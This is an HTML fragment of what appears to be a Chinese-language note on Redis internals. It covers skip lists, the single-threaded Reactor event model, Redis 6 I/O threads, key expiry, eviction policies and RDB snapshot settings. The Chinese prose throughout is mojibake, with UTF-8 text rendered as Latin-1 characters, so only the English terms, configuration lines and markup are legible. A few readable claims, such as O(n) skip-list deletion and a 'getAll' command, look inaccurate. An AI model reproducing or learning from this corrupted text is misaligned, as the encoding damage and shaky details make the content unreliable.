<p>å»ºç«‹ç´¢å¼•ä½¿ç”¨æŠ›ç¡¬å¸çš„æ–¹å¼å†³å®šï¼Œæ¯ä¸ªèŠ‚ç‚¹æœ‰50%æ¦‚ç‡ä¼šè¢«ææ‹”ï¼Œå¤§ä½“ä¸Šç´¢å¼•æ˜¯å‡åŒ€çš„ã€‚ </p>
<p>åˆ é™¤æ˜¯(O(n))æ—¶ï¼Œè‡ªä¸Šå‘ä¸‹ï¼Œ æŸ¥æ‰¾ç¬¬ä¸€æ¬¡å‡ºç°èŠ‚ç‚¹çš„ç´¢å¼•ï¼Œå¹¶é€å±‚æ‰¾åˆ°æ¯ä¸€å±‚å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå¦‚æœè¯¥å±‚åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆ™åˆ é™¤æ•´å±‚ã€‚ </p>
<p>ç›¸æ¯”äºäºŒå‰æŸ¥æ‰¾æ ‘ï¼Œè·³è¡¨ç»´æŒç»“æ„å¹³è¡¡çš„æˆæœ¬æ¯”è¾ƒä½ï¼Œå®Œå…¨é éšæœºã€‚è€ŒäºŒå‰æŸ¥æ‰¾æ ‘éœ€è¦Rebalanceæ¥é‡æ–°è°ƒæ•´å¹³è¡¡çš„ç»“æ„</p>
<h2 id="Rediså•çº¿ç¨‹æ¨¡å‹è¯¦è§£"><a href="#Rediså•çº¿ç¨‹æ¨¡å‹è¯¦è§£" class="headerlink" title="Rediså•çº¿ç¨‹æ¨¡å‹è¯¦è§£"></a>Rediså•çº¿ç¨‹æ¨¡å‹è¯¦è§£</h2><p><strong>Redis åŸºäº Reactor æ¨¡å¼æ¥è®¾è®¡å¼€å‘äº†è‡ªå·±çš„ä¸€å¥—é«˜æ•ˆçš„äº‹ä»¶å¤„ç†æ¨¡å‹</strong> ï¼ˆNetty çš„çº¿ç¨‹æ¨¡å‹ä¹ŸåŸºäº Reactor æ¨¡å¼ï¼ŒReactor æ¨¡å¼æ˜¯é«˜æ€§èƒ½ IO çš„åŸºçŸ³ï¼‰ï¼Œè¿™å¥—äº‹ä»¶å¤„ç†æ¨¡å‹å¯¹åº”çš„æ˜¯ Redis ä¸­çš„æ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ï¼ˆfile event handlerï¼‰ã€‚ç”±äºæ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ï¼ˆfile event handlerï¼‰æ˜¯å•çº¿ç¨‹æ–¹å¼è¿è¡Œçš„ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½è¯´ Redis æ˜¯å•çº¿ç¨‹æ¨¡å‹ã€‚</p>
<p><strong>æ—¢ç„¶æ˜¯å•çº¿ç¨‹ï¼Œé‚£æ€ä¹ˆç›‘å¬å¤§é‡çš„å®¢æˆ·ç«¯è¿æ¥å‘¢ï¼Ÿ</strong></p>
<p>Redis é€šè¿‡<strong>IO å¤šè·¯å¤ç”¨ç¨‹åº</strong> æ¥ç›‘å¬æ¥è‡ªå®¢æˆ·ç«¯çš„å¤§é‡è¿æ¥ï¼ˆæˆ–è€…è¯´æ˜¯ç›‘å¬å¤šä¸ª socketï¼‰ï¼Œå®ƒä¼šå°†æ„Ÿå…´è¶£çš„äº‹ä»¶åŠç±»å‹ï¼ˆè¯»ã€å†™ï¼‰æ³¨å†Œåˆ°å†…æ ¸ä¸­å¹¶ç›‘å¬æ¯ä¸ªäº‹ä»¶æ˜¯å¦å‘ç”Ÿã€‚</p>
<p>è¿™æ ·çš„å¥½å¤„éå¸¸æ˜æ˜¾ï¼š I&#x2F;O å¤šè·¯å¤ç”¨æŠ€æœ¯çš„ä½¿ç”¨è®© Redis ä¸éœ€è¦é¢å¤–åˆ›å»ºå¤šä½™çš„çº¿ç¨‹æ¥ç›‘å¬å®¢æˆ·ç«¯çš„å¤§é‡è¿æ¥ï¼Œé™ä½äº†èµ„æºçš„æ¶ˆè€—ï¼ˆå’Œ NIO ä¸­çš„ Selector ç»„ä»¶å¾ˆåƒï¼‰ã€‚</p>
<p>å¦å¤–ï¼Œ Redis æœåŠ¡å™¨æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ç¨‹åºï¼ŒæœåŠ¡å™¨éœ€è¦å¤„ç†ä¸¤ç±»äº‹ä»¶ï¼š 1. æ–‡ä»¶äº‹ä»¶ï¼›2. æ—¶é—´äº‹ä»¶ã€‚</p>
<p>æ—¶é—´äº‹ä»¶ä¸éœ€è¦å¤šèŠ±æ—¶é—´äº†è§£ï¼Œæ¥è§¦æœ€å¤šçš„è¿˜æ˜¯<strong>æ–‡ä»¶äº‹ä»¶</strong>ï¼ˆå®¢æˆ·ç«¯è¿›è¡Œè¯»å–å†™å…¥ç­‰æ“ä½œï¼Œæ¶‰åŠä¸€ç³»åˆ—ç½‘ç»œé€šä¿¡ï¼‰ã€‚</p>
<p>ã€ŠRedis è®¾è®¡ä¸å®ç°ã€‹ï¼š</p>
<blockquote>
<p>Redis åŸºäº Reactor æ¨¡å¼å¼€å‘äº†è‡ªå·±çš„ç½‘ç»œäº‹ä»¶å¤„ç†å™¨ï¼šè¿™ä¸ªå¤„ç†å™¨è¢«ç§°ä¸ºæ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ï¼ˆfile event handlerï¼‰ã€‚æ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ä½¿ç”¨ I&#x2F;O å¤šè·¯å¤ç”¨ï¼ˆmultiplexingï¼‰ç¨‹åºæ¥åŒæ—¶ç›‘å¬å¤šä¸ªå¥—æ¥å­—ï¼Œå¹¶æ ¹æ®å¥—æ¥å­—ç›®å‰æ‰§è¡Œçš„ä»»åŠ¡æ¥ä¸ºå¥—æ¥å­—å…³è”ä¸åŒçš„äº‹ä»¶å¤„ç†å™¨ã€‚</p>
<p>å½“è¢«ç›‘å¬çš„å¥—æ¥å­—å‡†å¤‡å¥½æ‰§è¡Œè¿æ¥åº”ç­”ï¼ˆacceptï¼‰ã€è¯»å–ï¼ˆreadï¼‰ã€å†™å…¥ï¼ˆwriteï¼‰ã€å…³ é—­ï¼ˆcloseï¼‰ç­‰æ“ä½œæ—¶ï¼Œä¸æ“ä½œç›¸å¯¹åº”çš„æ–‡ä»¶äº‹ä»¶å°±ä¼šäº§ç”Ÿï¼Œè¿™æ—¶æ–‡ä»¶äº‹ä»¶å¤„ç†å™¨å°±ä¼šè°ƒç”¨å¥—æ¥å­—ä¹‹å‰å…³è”å¥½çš„äº‹ä»¶å¤„ç†å™¨æ¥å¤„ç†è¿™äº›äº‹ä»¶ã€‚</p>
<p><strong>è™½ç„¶æ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ä»¥å•çº¿ç¨‹æ–¹å¼è¿è¡Œï¼Œä½†é€šè¿‡ä½¿ç”¨ I&#x2F;O å¤šè·¯å¤ç”¨ç¨‹åºæ¥ç›‘å¬å¤šä¸ªå¥—æ¥å­—</strong>ï¼Œæ–‡ä»¶äº‹ä»¶å¤„ç†å™¨æ—¢å®ç°äº†é«˜æ€§èƒ½çš„ç½‘ç»œé€šä¿¡æ¨¡å‹ï¼Œåˆå¯ä»¥å¾ˆå¥½åœ°ä¸ Redis æœåŠ¡å™¨ä¸­å…¶ä»–åŒæ ·ä»¥å•çº¿ç¨‹æ–¹å¼è¿è¡Œçš„æ¨¡å—è¿›è¡Œå¯¹æ¥ï¼Œè¿™ä¿æŒäº† Redis å†…éƒ¨å•çº¿ç¨‹è®¾è®¡çš„ç®€å•æ€§ã€‚</p>
</blockquote>
<p>å¯ä»¥çœ‹å‡ºï¼Œæ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ï¼ˆfile event handlerï¼‰ä¸»è¦æ˜¯åŒ…å« 4 ä¸ªéƒ¨åˆ†ï¼š</p>
<ul>
<li>å¤šä¸ª socketï¼ˆå®¢æˆ·ç«¯è¿æ¥ï¼‰</li>
<li>IO å¤šè·¯å¤ç”¨ç¨‹åºï¼ˆæ”¯æŒå¤šä¸ªå®¢æˆ·ç«¯è¿æ¥çš„å…³é”®ï¼‰</li>
<li>æ–‡ä»¶äº‹ä»¶åˆ†æ´¾å™¨ï¼ˆå°† socket å…³è”åˆ°ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ï¼‰</li>
<li>äº‹ä»¶å¤„ç†å™¨ï¼ˆè¿æ¥åº”ç­”å¤„ç†å™¨ã€å‘½ä»¤è¯·æ±‚å¤„ç†å™¨ã€å‘½ä»¤å›å¤å¤„ç†å™¨ï¼‰</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261423312.png" alt="redisäº‹ä»¶å¤„ç†å™¨"></p>
<h3 id="Rediså•çº¿ç¨‹çš„æ³¨æ„äº‹é¡¹"><a href="#Rediså•çº¿ç¨‹çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="Rediså•çº¿ç¨‹çš„æ³¨æ„äº‹é¡¹"></a>Rediså•çº¿ç¨‹çš„æ³¨æ„äº‹é¡¹</h3><p>æœ€å¥½ç¦ç”¨åƒgetAllè¿™ç§çš„å‘½ä»¤ï¼Œè¿™ç±»å‘½ä»¤è€—æ—¶å¾ˆä¹…ã€‚</p>
<h2 id="Reactor"><a href="#Reactor" class="headerlink" title="Reactor"></a>Reactor</h2><p>å•Reactorå•çº¿ç¨‹</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261423695.png" alt="img"></p>
<p>å¤šçº¿ç¨‹çš„Reactor</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261423746.png" alt="img"></p>
<p>ä¸»ä»Reactorå¤šçº¿ç¨‹</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261424051.png" alt="img"></p>
<h2 id="Redisä¸ºä»€ä¹ˆä¸ä½¿ç”¨å¤šçº¿ç¨‹"><a href="#Redisä¸ºä»€ä¹ˆä¸ä½¿ç”¨å¤šçº¿ç¨‹" class="headerlink" title="Redisä¸ºä»€ä¹ˆä¸ä½¿ç”¨å¤šçº¿ç¨‹?"></a>Redisä¸ºä»€ä¹ˆä¸ä½¿ç”¨å¤šçº¿ç¨‹?</h2><p>Redis4.0 å¢åŠ çš„å¤šçº¿ç¨‹ä¸»è¦æ˜¯é’ˆå¯¹ä¸€äº›å¤§é”®å€¼å¯¹çš„åˆ é™¤æ“ä½œçš„å‘½ä»¤ï¼Œä½¿ç”¨è¿™äº›å‘½ä»¤å°±ä¼šä½¿ç”¨ä¸»çº¿ç¨‹ä¹‹å¤–çš„å…¶ä»–çº¿ç¨‹æ¥â€œå¼‚æ­¥å¤„ç†â€ã€‚ ä¾‹å¦‚ UNLINKã€FLUSHALL ASYNCã€FLUSHDB ASYNC ç­‰éé˜»å¡çš„åˆ é™¤æ“ä½œã€‚å¯¹äº Redis ä¸­çš„ä¸€äº›è¶…å¤§é”®å€¼å¯¹ï¼Œå‡ å MB æˆ–è€…å‡ ç™¾ MB çš„æ•°æ®å¹¶ä¸èƒ½åœ¨å‡ æ¯«ç§’çš„æ—¶é—´å†…å¤„ç†å®Œï¼ŒRedis å¯èƒ½ä¼šéœ€è¦åœ¨é‡Šæ”¾å†…å­˜ç©ºé—´ä¸Šæ¶ˆè€—è¾ƒå¤šçš„æ—¶é—´ï¼Œè¿™äº›æ“ä½œå°±ä¼šé˜»å¡å¾…å¤„ç†çš„ä»»åŠ¡ï¼Œå½±å“ Redis æœåŠ¡å¤„ç†è¯·æ±‚çš„é€Ÿåº¦å’Œå¯ç”¨æ€§ã€‚</p>
<p>å•çº¿ç¨‹ç¼–ç¨‹å®¹æ˜“å¹¶ä¸”æ›´å®¹æ˜“ç»´æŠ¤ï¼Œçœå»äº†å¾ˆå¤šä¸Šä¸‹æ–‡åˆ‡æ¢çº¿ç¨‹çš„æ—¶é—´ã€‚</p>
<p>Redisçš„æ€§èƒ½ç“¶é¢ˆä¸åœ¨CPUï¼Œä¸»è¦åœ¨å†…å­˜å’Œç½‘ç»œã€‚</p>
<p>å¤šçº¿ç¨‹å°±ä¼šå­˜åœ¨æ­»é”ã€çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ç­‰é—®é¢˜ï¼Œç”šè‡³ä¼šå½±å“æ€§èƒ½ã€‚</p>
<p><strong>1.å®˜æ–¹ç­”æ¡ˆ</strong></p>
<p>å› ä¸ºRedisæ˜¯åŸºäºå†…å­˜çš„æ“ä½œï¼ŒCPUä¸æ˜¯Redisçš„ç“¶é¢ˆï¼ŒRedisçš„ç“¶é¢ˆæœ€æœ‰å¯èƒ½æ˜¯æœºå™¨å†…å­˜çš„å¤§å°æˆ–è€…ç½‘ç»œå¸¦å®½ã€‚æ—¢ç„¶å•çº¿ç¨‹å®¹æ˜“å®ç°ï¼Œè€Œä¸”CPUä¸ä¼šæˆä¸ºç“¶é¢ˆï¼Œé‚£å°±é¡ºç†æˆç« åœ°é‡‡ç”¨å•çº¿ç¨‹çš„æ–¹æ¡ˆäº†ã€‚</p>
<p><strong>2.æ€§èƒ½æŒ‡æ ‡</strong></p>
<p>å…³äºredisçš„æ€§èƒ½ï¼Œæ™®é€šç¬”è®°æœ¬è½»æ¾å¤„ç†æ¯ç§’å‡ åä¸‡çš„è¯·æ±‚ã€‚</p>
<p><strong>3.è¯¦ç»†åŸå› </strong></p>
<p><strong>1ï¼‰ä¸éœ€è¦å„ç§é”çš„æ€§èƒ½æ¶ˆè€—</strong></p>
<p>Redisçš„æ•°æ®ç»“æ„å¹¶ä¸å…¨æ˜¯ç®€å•çš„Key-Valueï¼Œè¿˜æœ‰listï¼Œhashç­‰å¤æ‚çš„ç»“æ„ï¼Œè¿™äº›ç»“æ„æœ‰å¯èƒ½ä¼šè¿›è¡Œå¾ˆç»†ç²’åº¦çš„æ“ä½œï¼Œæ¯”å¦‚åœ¨å¾ˆé•¿çš„åˆ—è¡¨åé¢æ·»åŠ ä¸€ä¸ªå…ƒç´ ï¼Œåœ¨hashå½“ä¸­æ·»åŠ æˆ–è€…åˆ é™¤ä¸€ä¸ªå¯¹è±¡ã€‚è¿™äº›æ“ä½œå¯èƒ½å°±éœ€è¦åŠ éå¸¸å¤šçš„é”ï¼Œå¯¼è‡´çš„ç»“æœæ˜¯åŒæ­¥å¼€é”€å¤§å¤§å¢åŠ ã€‚</p>
<p>åœ¨å•çº¿ç¨‹çš„æƒ…å†µä¸‹ï¼Œå°±ä¸ç”¨å»è€ƒè™‘å„ç§é”çš„é—®é¢˜ï¼Œä¸å­˜åœ¨åŠ é”é‡Šæ”¾é”æ“ä½œï¼Œæ²¡æœ‰å› ä¸ºå¯èƒ½å‡ºç°æ­»é”è€Œå¯¼è‡´çš„æ€§èƒ½æ¶ˆè€—ã€‚</p>
<p><strong>2ï¼‰å•çº¿ç¨‹å¤šè¿›ç¨‹é›†ç¾¤æ–¹æ¡ˆ</strong></p>
<p>å•çº¿ç¨‹çš„å¨åŠ›å®é™…ä¸Šéå¸¸å¼ºå¤§ï¼Œæ¯æ ¸å¿ƒæ•ˆç‡ä¹Ÿéå¸¸é«˜ï¼Œå¤šçº¿ç¨‹è‡ªç„¶æ˜¯å¯ä»¥æ¯”å•çº¿ç¨‹æœ‰æ›´é«˜çš„æ€§èƒ½ä¸Šé™ï¼Œä½†æ˜¯åœ¨ä»Šå¤©çš„è®¡ç®—ç¯å¢ƒä¸­ï¼Œå³ä½¿æ˜¯å•æœºå¤šçº¿ç¨‹çš„ä¸Šé™ä¹Ÿå¾€å¾€ä¸èƒ½æ»¡è¶³éœ€è¦äº†ï¼Œéœ€è¦è¿›ä¸€æ­¥æ‘¸ç´¢çš„æ˜¯å¤šæœåŠ¡å™¨é›†ç¾¤åŒ–çš„æ–¹æ¡ˆï¼Œè¿™äº›æ–¹æ¡ˆä¸­å¤šçº¿ç¨‹çš„æŠ€æœ¯ç…§æ ·æ˜¯ç”¨ä¸ä¸Šçš„ã€‚</p>
<p><strong>æ‰€ä»¥å•çº¿ç¨‹ã€å¤šè¿›ç¨‹çš„é›†ç¾¤ä¸å¤±ä¸ºä¸€ä¸ªæ—¶é«¦çš„è§£å†³æ–¹æ¡ˆã€‚</strong></p>
<p><strong>3ï¼‰CPUæ¶ˆè€—</strong></p>
<p>é‡‡ç”¨å•çº¿ç¨‹ï¼Œé¿å…äº†ä¸å¿…è¦çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å’Œç«äº‰æ¡ä»¶ï¼Œä¹Ÿä¸å­˜åœ¨å¤šè¿›ç¨‹æˆ–è€…å¤šçº¿ç¨‹å¯¼è‡´çš„åˆ‡æ¢è€Œæ¶ˆè€— CPUã€‚</p>
<p>ä½†æ˜¯å¦‚æœCPUæˆä¸ºRedisç“¶é¢ˆï¼Œæˆ–è€…ä¸æƒ³è®©æœåŠ¡å™¨å…¶ä»–CUPæ ¸é—²ç½®çš„è¯ï¼Œå¯ä»¥è€ƒè™‘å¤šèµ·å‡ ä¸ªRedisè¿›ç¨‹ï¼ŒRedisæ˜¯key-valueæ•°æ®åº“ï¼Œä¸æ˜¯å…³ç³»æ•°æ®åº“ï¼Œæ•°æ®ä¹‹é—´æ²¡æœ‰çº¦æŸã€‚åªè¦å®¢æˆ·ç«¯åˆ†æ¸…å“ªäº›keyæ”¾åœ¨å“ªä¸ªRedisè¿›ç¨‹ä¸Šå°±å¯ä»¥äº†ã€‚</p>
<h2 id="Redis6ä¸ºä»€ä¹ˆå¼•å…¥å¤šçº¿ç¨‹"><a href="#Redis6ä¸ºä»€ä¹ˆå¼•å…¥å¤šçº¿ç¨‹" class="headerlink" title="Redis6ä¸ºä»€ä¹ˆå¼•å…¥å¤šçº¿ç¨‹?"></a>Redis6ä¸ºä»€ä¹ˆå¼•å…¥å¤šçº¿ç¨‹?</h2><p>ä¸»è¦æ˜¯ä¸ºäº†æé«˜ç½‘ç»œIOè¯»å†™æ€§èƒ½ï¼Œå› ä¸ºè¿™ä¸ªç®—æ˜¯Redisä¸­çš„ä¸€ä¸ªæ€§èƒ½ç“¶é¢ˆã€‚Redisçš„å¤šçº¿ç¨‹åªæ˜¯åœ¨ç½‘ç»œæ•°æ®çš„è¯»å†™è¿™ç±»è€—æ—¶æ“ä½œä¸Šä½¿ç”¨ï¼Œ æ‰§è¡Œå‘½ä»¤ä»ç„¶æ˜¯å•çº¿ç¨‹é¡ºåºæ‰§è¡Œï¼Œå› æ­¤ä¸éœ€è¦æ‹…å¿ƒçº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">4æ ¸å»ºè®®è®¾ç½®2-3ä¸ªçº¿ç¨‹ï¼Œ8æ ¸è®¾ç½®6ä¸ªçº¿ç¨‹</span></span><br><span class="line">io-threads-do-reads yes  io-threads 4 </span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261424062.png" alt="ä¸‹è½½"></p>
<h2 id="Redisç»™ç¼“å­˜æ•°æ®è®¾ç½®è¿‡æœŸæ—¶é—´æœ‰å•¥ç”¨"><a href="#Redisç»™ç¼“å­˜æ•°æ®è®¾ç½®è¿‡æœŸæ—¶é—´æœ‰å•¥ç”¨" class="headerlink" title="Redisç»™ç¼“å­˜æ•°æ®è®¾ç½®è¿‡æœŸæ—¶é—´æœ‰å•¥ç”¨"></a>Redisç»™ç¼“å­˜æ•°æ®è®¾ç½®è¿‡æœŸæ—¶é—´æœ‰å•¥ç”¨</h2><ul>
<li><p>å†…å­˜æœ‰é™</p>
</li>
<li><p>ä¸šåŠ¡éœ€æ±‚ï¼Œä¾‹å¦‚çŸ­ä¿¡éªŒè¯ç 1åˆ†é’Ÿæœ‰æ•ˆï¼Œ jwt30åˆ†é’Ÿæœ‰æ•ˆã€‚</p>
</li>
</ul>
<h2 id="Redisæ˜¯å¦‚ä½•åˆ¤æ–­æ•°æ®æ˜¯å¦è¿‡æœŸçš„"><a href="#Redisæ˜¯å¦‚ä½•åˆ¤æ–­æ•°æ®æ˜¯å¦è¿‡æœŸçš„" class="headerlink" title="Redisæ˜¯å¦‚ä½•åˆ¤æ–­æ•°æ®æ˜¯å¦è¿‡æœŸçš„?"></a>Redisæ˜¯å¦‚ä½•åˆ¤æ–­æ•°æ®æ˜¯å¦è¿‡æœŸçš„?</h2><p>ç”¨è¿‡æœŸå­—å…¸ï¼ˆç±»ä¼¼hashè¡¨ï¼‰æ¥ä¿å­˜ã€‚è¿‡æœŸå­—å…¸çš„é”®æŒ‡å‘ Redis æ•°æ®åº“ä¸­çš„æŸä¸ª key(é”®)ï¼Œè¿‡æœŸå­—å…¸çš„å€¼æ˜¯ä¸€ä¸ª long long ç±»å‹çš„æ•´æ•°ï¼Œè¿™ä¸ªæ•´æ•°ä¿å­˜äº† key æ‰€æŒ‡å‘çš„æ•°æ®åº“é”®çš„è¿‡æœŸæ—¶é—´ï¼ˆæ¯«ç§’ç²¾åº¦çš„ UNIX æ—¶é—´æˆ³ï¼‰ã€‚</p>
<p>é€šè¿‡æŸ¥è¯¢è¿‡æœŸå­—å…¸ï¼Œæ£€æŸ¥ä¸‹é¢çš„æ¡ä»¶åˆ¤æ–­æ˜¯å¦è¿‡æœŸï¼š</p>
<ol>
<li>æ£€æŸ¥ç»™å®šçš„é”®æ˜¯å¦åœ¨è¿‡æœŸå­—å…¸ä¸­ï¼Œå¦‚æœå­˜åœ¨å°±è·å–é”®çš„è¿‡æœŸæ—¶é—´ã€‚</li>
<li>æ£€æŸ¥å½“å‰ UNIX æ—¶é—´æˆ³æ˜¯å¦å¤§äºé”®çš„è¿‡æœŸæ—¶é—´ï¼Œæ˜¯å°±è¿‡æœŸï¼Œå¦åˆ™æœªè¿‡æœŸã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261424468.png" alt="redisè¿‡æœŸæ—¶é—´"></p>
<h2 id="Redisåˆ é™¤ç­–ç•¥"><a href="#Redisåˆ é™¤ç­–ç•¥" class="headerlink" title="Redisåˆ é™¤ç­–ç•¥?"></a>Redisåˆ é™¤ç­–ç•¥?</h2><p>æƒ°æ€§åˆ é™¤ï¼šåªä¼šåœ¨å–å‡ºkeyçš„æ—¶å€™æ‰å¯¹æ•°æ®è¿›è¡Œè¿‡æœŸæ£€æŸ¥ã€‚è¿™æ ·å¯¹CPUæœ€å‹å¥½ï¼Œä½†æ˜¯å¯èƒ½ä¼šé€ æˆå¤§é‡çš„è¿‡æœŸkeyæ²¡æœ‰è¢«åˆ é™¤ã€‚</p>
<p>å®šæœŸåˆ é™¤ï¼šæ¯éš”ä¸€æ®µæ—¶é—´æŠ½å–å‡ºä¸€æ‰¹keyæ‰§è¡Œåˆ é™¤è¿‡æœŸkeyæ“ä½œã€‚å¹¶ä¸”ï¼ŒRedisåº•å±‚ä¼šé€šè¿‡é™åˆ¶åˆ é™¤æ“ä½œæ‰§è¡Œçš„æ—¶é•¿å’Œé¢‘ç‡æ¥å‡å°‘åˆ é™¤æ“ä½œå¯¹CPUæ—¶é—´çš„å½±å“ã€‚</p>
<p>å®šæœŸåˆ é™¤å¯¹å†…å­˜å‹å¥½ï¼Œæƒ°æ€§åˆ é™¤å¯¹CPUå‹å¥½ï¼ŒRedisé‡‡ç”¨å®šæœŸåˆ é™¤+ æƒ°æ€§åˆ é™¤çš„æ–¹å¼ã€‚</p>
<h2 id="Rediså†…å­˜æ·˜æ±°æœºåˆ¶"><a href="#Rediså†…å­˜æ·˜æ±°æœºåˆ¶" class="headerlink" title="Rediså†…å­˜æ·˜æ±°æœºåˆ¶?"></a>Rediså†…å­˜æ·˜æ±°æœºåˆ¶?</h2><p>ä»…ä»…é€šè¿‡ç»™ key è®¾ç½®è¿‡æœŸæ—¶é—´è¿˜æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºè¿˜æ˜¯å¯èƒ½å­˜åœ¨å®šæœŸåˆ é™¤å’Œæƒ°æ€§åˆ é™¤æ¼æ‰äº†å¾ˆå¤šè¿‡æœŸ key çš„æƒ…å†µã€‚è¿™æ ·å°±å¯¼è‡´å¤§é‡è¿‡æœŸ key å †ç§¯åœ¨å†…å­˜é‡Œï¼Œç„¶åå°± Out of memory äº†ã€‚</p>
<p>é€šè¿‡Redis å†…å­˜æ·˜æ±°æœºåˆ¶å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>Redis æä¾› 6 ç§æ•°æ®æ·˜æ±°ç­–ç•¥ï¼š</p>
<ol>
<li><strong>volatile-lruï¼ˆleast recently usedï¼‰</strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­æŒ‘é€‰æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„æ•°æ®æ·˜æ±°ã€‚</li>
<li><strong>volatile-ttl</strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­æŒ‘é€‰å°†è¦è¿‡æœŸçš„æ•°æ®æ·˜æ±°ã€‚</li>
<li><strong>volatile-random</strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±°ã€‚</li>
<li><strong>allkeys-lruï¼ˆleast recently usedï¼‰</strong>ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨é”®ç©ºé—´ä¸­ï¼Œç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ keyï¼ˆè¿™ä¸ªæ˜¯æœ€å¸¸ç”¨çš„ï¼‰ã€‚</li>
<li><strong>allkeys-random</strong>ï¼šä»æ•°æ®é›†ï¼ˆserver.db[i].dictï¼‰ä¸­ä»»æ„é€‰æ‹©æ•°æ®æ·˜æ±°ã€‚</li>
<li><strong>no-eviction</strong>ï¼šç¦æ­¢é©±é€æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œæ–°å†™å…¥æ“ä½œä¼šæŠ¥é”™ã€‚è¿™ä¸ªå‡ ä¹æ²¡æœ‰äººä½¿ç”¨ã€‚</li>
</ol>
<p>4.0 ç‰ˆæœ¬åå¢åŠ ä»¥ä¸‹ä¸¤ç§ï¼š</p>
<ol>
<li><strong>volatile-lfuï¼ˆleast frequently usedï¼‰</strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„æ•°æ®é›†ï¼ˆserver.db[i].expiresï¼‰ä¸­æŒ‘é€‰æœ€ä¸ç»å¸¸ä½¿ç”¨çš„æ•°æ®æ·˜æ±°ã€‚</li>
<li><strong>allkeys-lfuï¼ˆleast frequently usedï¼‰</strong>ï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨é”®ç©ºé—´ä¸­ï¼Œç§»é™¤æœ€ä¸ç»å¸¸ä½¿ç”¨çš„ keyã€‚</li>
</ol>
<h2 id="RedisæŒä¹…åŒ–"><a href="#RedisæŒä¹…åŒ–" class="headerlink" title="RedisæŒä¹…åŒ–"></a>RedisæŒä¹…åŒ–</h2><p>ä¸€èˆ¬ä¸è¦å¼€å¯æŒä¹…åŒ–ï¼Œå­˜çš„æ˜¯ç¼“å­˜ï¼Œå¾—çœ‹å…·ä½“åœºæ™¯ã€‚</p>
<p>RDBï¼ˆsnapshottingï¼‰ï¼š Redisé»˜è®¤çš„æŒä¹…åŒ–æ–¹å¼ï¼Œæ¢å¤é€Ÿåº¦å¿«ç¼ºå¤±çš„ä¹Ÿå¤šã€‚é€šè¿‡forkä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨COWï¼ˆCopy on writeï¼‰æ¥æ‹å¿«ç…§ï¼Œä¸»è¿›ç¨‹ä¿®æ”¹éœ€è¦æ–°å¼€å†…å­˜ï¼Œç„¶åä¿®æ”¹æŒ‡é’ˆï¼Œå­è¿›ç¨‹æ‹çš„å¿«ç…§è¿˜æ˜¯åŸæ¥çš„æ•°æ®ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">save 900 1           #åœ¨900ç§’(15åˆ†é’Ÿ)ä¹‹åï¼Œå¦‚æœè‡³å°‘æœ‰1ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼ŒRediså°±ä¼šè‡ªåŠ¨è§¦å‘BGSAVEå‘½ä»¤åˆ›å»ºå¿«ç…§ã€‚</span><br><span class="line"></span><br><span class="line">save 300 10          #åœ¨300ç§’(5åˆ†é’Ÿ)ä¹‹åï¼Œå¦‚æœè‡³å°‘æœ‰10ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼ŒRediså°±ä¼šè‡ªåŠ¨è§¦å‘BGSAVEå‘½ä»¤åˆ›å»ºå¿«ç…§ã€‚</span><br><span class="line"></span><br><span class="line">save 60 10000        #åœ¨60ç§’(1åˆ†é’Ÿ)ä¹‹åï¼Œå¦‚æœè‡³å°‘æœ‰10000ä¸ªkeyå‘ç”Ÿå˜åŒ–ï¼ŒRediså°±ä¼šè‡ªåŠ¨è§¦å‘BGSAVEå‘½ä»¤åˆ›å»ºå¿«ç…§ã€‚</span><br></pre></td></tr></table></figure>

